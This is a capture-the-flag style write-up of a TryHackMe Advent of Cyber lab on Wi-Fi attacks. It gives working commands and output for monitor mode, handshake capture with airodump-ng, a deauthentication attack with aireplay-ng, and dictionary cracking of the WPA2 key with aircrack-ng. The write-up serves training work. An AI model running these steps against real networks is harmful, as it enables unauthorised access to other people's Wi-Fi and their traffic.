---
title: Day 11 If you_d like to WPA, press the star key!
date: 2024-12-15 00:00:00 +0200
categories: Cybersecurity Tryhackme
tags:
  - THM
  - Writeups
  - Advent_of_cyber
by: Mahmud
---
#### Learning Objectives

- Understand what Wi-Fi is
- Explore its importance for an organisation
- Learn the different Wi-Fi attacks
- Learn about the WPA/WPA2 cracking attack

#### Connect the VM using SSH 
``ssh glitch@MACHINE_IP`

#### Some WIFI Attack

1. **Evil Twin Attack**:
    
    - The attacker creates a fake access point with a name similar to a legitimate one (e.g., "Home_Internnet" instead of "Home_Internet").
    - Users are disconnected from their real Wi-Fi network through de-authentication packets, and frustrated users often connect to the attacker’s access point, enabling traffic interception.
2. **Rogue Access Point**:
    
    - The attacker sets up an open Wi-Fi network near an organization’s premises.
    - Devices that auto-connect to open networks may join the rogue network, allowing attackers to intercept communications.
3. **WPS Attack**:
    
    - Exploits weaknesses in Wi-Fi Protected Setup (WPS), which uses an 8-digit PIN for easy connections.
    - Attackers capture router responses during a WPS handshake and brute-force the PIN to extract the Pre-Shared Key (PSK).
4. **WPA/WPA2 Cracking**:
    
    - Targets Wi-Fi Protected Access (WPA) by exploiting weak Pre-Shared Keys (PSK).
    - Attackers send de-authentication packets to disconnect users and capture the 4-way handshake during reconnection.
    - The captured handshake file is cracked using brute-force or dictionary attacks.

These techniques highlight the importance of securing Wi-Fi networks with strong passwords, disabling WPS, and avoiding auto-connecting to open networks.


#### WPA/WPA2 Cracking Explained

1. **How It Works**:
    
    - Attackers capture the **4-way handshake** between a device and Wi-Fi router, which happens during connection.
    - To speed this up, attackers send **deauthentication packets** to disconnect a device, forcing it to reconnect.
2. **The 4-Way Handshake**:
    
    - The router and device exchange encrypted messages to confirm they both have the correct password (PSK) without revealing it.
    - If everything matches, the connection is secured.
3. **The Vulnerability**:
    
    - Attackers can capture the handshake and use **brute-force** or **dictionary attacks** offline to guess the password.
    - They use tools like aircrack-ng to try different passwords until one works.

#### Practical
1. in SSH session run `iw dev` to show wireless devices and there configurations
2. you will see 
```shell-session
glitch@wifi:~$ iw dev
phy#2
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm

```
{: .nolineno }

The device/interface `wlan2` is available to us, and there are two important details to take away from this output that will be useful to us:

1. The `addr` is the **MAC/BSSID** of our device. BSSID stands for Basic Service Set Identifier, and it's a unique identifier for a wireless device or access point's physical address.
2. The `type` is shown as **managed**. This is the standard mode used by most Wi-Fi devices (like laptops, phones, etc.) to connect to Wi-Fi networks. In managed mode, the device acts as a client, connecting to an access point to join a network. There is another mode called **monitor**, which we will discuss shortly.
3. now let's scan for available wifi using `sudo iw dev wlan2 scan`
4. you will see
```shell-session
glitch@wifi:~$ sudo iw dev wlan2 scan
BSS 02:00:00:00:00:00(on wlan2)
        last seen: 824.796s [boottime]
        TSF: 1734565125524160 usec (20075d, 23:38:45)
        freq: 2437
        beacon interval: 100 TUs
        capability: ESS Privacy ShortSlotTime (0x0411)
        signal: -30.00 dBm
        last seen: 0 ms ago
        Information elements from Probe Response frame:
        SSID: MalwareM_AP
        Supported rates: 1.0* 2.0* 5.5* 11.0* 6.0 9.0 12.0 18.0 
        DS Parameter set: channel 6
        ERP: Barker_Preamble_Mode
        Extended supported rates: 24.0 36.0 48.0 54.0 
        RSN:     * Version: 1
                 * Group cipher: CCMP
                 * Pairwise ciphers: CCMP
                 * Authentication suites: PSK
                 * Capabilities: 1-PTKSA-RC 1-GTKSA-RC (0x0000)
        Supported operating classes:
                 * current operating class: 81
        Extended capabilities:
                 * Extended Channel Switching
                 * Operating Mode Notification
glitch@wifi:~$ 
```{: .nolineno }

5. as we can see this is access point because of

- **BSSID and SSID**:
    
    - The device's SSID is "MalwareM_AP," meaning it's advertising a network name like an access point.
- **Security**:
    
    - It uses **WPA2** security, shown by the presence of **RSN**.
    - Encryption is **CCMP** (a secure WPA2 method).
    - Authentication type is **PSK** (password-based).
- **Channel**:
    
    - The network uses **channel 6**, part of the **2.4 GHz band**, commonly used for Wi-Fi with minimal interference.

6. Using Monitor Mode on a Wireless Device

1. **What is Monitor Mode?**
    
    - A special mode for Wi-Fi devices to listen to all wireless traffic on a channel without joining a network.
    - Useful for network analysis and security checks.
2. **Steps to Enable Monitor Mode**:
    
    - Turn the device off: `sudo ip link set dev wlan2 down`
    - Switch to monitor mode: `sudo iw dev wlan2 set type monitor`
    - Turn the device back on: `sudo ip link set dev wlan2 up`
3. **Check Monitor Mode**:
    
    - Run `sudo iw dev wlan2 info` to confirm.
    - Output shows **type: monitor**, channel, and other details, confirming the mode is active.
    - as we can see  the **monitor** mode enabled
```shell-session
 glitch@wifi:~$ sudo iw dev  wlan2 info
Interface wlan2
        ifindex 5
        wdev 0x200000001
        addr 02:00:00:00:02:00
        type monitor
        wiphy 2
        channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
        txpower 20.00 dBm
glitch@wifi:~$ 
   
```{: .nolineno }

6. Open 2 SSH session in 2 separate terminal to help with attack and review what happen
7. in first terminal we will use `airodump` tool this use for WiFi cracking let's scan the available networks using    `sudo airodump-ng wlan` to stop it press `Ctrl+C`
```shell-session
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
                                                                                 
 02:00:00:00:00:00  -28      125        0    0   6   54   WPA2 CCMP   PSK  Malwa 
                                                                                 
```
{: .nolineno }

8. To capture the 4-way handshake,run:  
`sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2`.  
This targets the network on channel 6 with the specified MAC address (BSSID) and saves traffic data to files starting with "output-file." If a client is connected to the access point, a deauthentication attack can force a handshake capture. Otherwise, the handshake will be captured when a new client connects. Keep the command running until the attack is complete.
it will out put this 
```shell-session
BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 02:00:00:00:00:00  -28 100      631        8    0   6   54   WPA2 CCMP   PSK  MalwareM_AP  

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 02:00:00:00:00:00  02:00:00:00:01:00  -29    1 - 5      0      140
```
{: .nolineno }

**Note** that the `STATION` section shows the device's BSSID (MAC) of `02:00:00:00:01:00` that is connected to the access point.

9. on the second terminal, we will launch the deauthentication attack
   To force a client to reconnect and capture the handshake:
- **Send Deauthentication Packets**: Use **aireplay-ng** to disconnect the client from the Wi-Fi.
- **Force Reconnection**: The client will automatically try to reconnect, triggering the 4-way handshake.
- **Capture the Handshake**: **airodump-ng** captures the handshake during reconnection for cracking attempts.

  can do this with `sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2`
    - `-0` flag indicates that we are using the deauthentication attack,
    - `1` value is the number of deauths to send. 
    -  `-a` indicates the BSSID of the access point 
    - `-c` indicates the BSSID of the client to deauthenticate.
the output is
```shell-session
glitch@wifi:~$ sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
19:29:37  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 6
19:29:38  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00:01:00] [ 0| 0 ACKs]
```
{: .nolineno }

10. in first terminal we can see that `WPA handshake: 02:00:00:00:00:00` is captured and it will save in our output file 

11. to crack the captured WPA/WPA2 handshake using a dictionary attack :
- go back to second terminal 
- Use the **rockyou.txt** wordlist located in `/home/glitch/`.
- Run the command:
- `sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*.cap`
    -  `-a 2`: WPA/WPA2 attack mode.
    - `-b`: The BSSID of the access point.
    - `-w`: Specifies the wordlist to use for cracking.
    - `output*.cap`: Captured handshake file.
  the output is 
```shell-session
    Aircrack-ng 1.6 

      [00:00:01] 504/513 keys tested (802.69 k/s) 

      Time left: 0 seconds                                      98.25%

                        KEY FOUND! [ fluffy/champ24 ]


      Master Key     : 54 42 17 98 25 7C 66 3C 5D 2A A4 C8 0A AC 37 E6 
                       80 92 EC FE 5E EE C3 AC DB 1D 80 6C 6D 54 D3 5E 

      Transient Key  : 31 EA 8A A5 9C 55 BB 30 47 83 19 BA 2D 63 36 A3 
                       5C 93 FE D0 F1 F6 49 91 55 29 C1 4B 9F 9B 99 B6 
                       41 E7 81 38 E3 8B 0C 37 EB 14 1B EF C0 74 B6 6C 
                       C3 09 A9 6E 6F 1E B4 B8 35 3F 8F DD D5 C4 C0 1C 

      EAPOL HMAC     : 98 E0 B2 59 95 8C 2E 1D 82 7C 8D BB FE 10 4B D0 


```
{: .nolineno }

as we can see the PSK is `fluffy/champ24 `

11. at the end we can enter the access point using the command
```shell-session
glitch@wifi:~$ wpa_passphrase MalwareM_AP 'fluffy/champ24 ' > config
glitch@wifi:~$ sudo wpa_supplicant -B -c config -i wlan2
```

we get 
```
Successfully initialized wpa_supplicant                                          
rfkill: Cannot get wiphy information 
```
{: .nolineno }

**Note**: If you get a `rfkill: Cannot get wiphy information` error, you can **ignore** it. You will also notice that wpa_supplicant has automatically switched our wlan2 interface to managed mode.

Giving it about 10 seconds and checking the wireless interfaces once again with `iw dev` shows that we have joined the `MalwareM_AP SSID`.
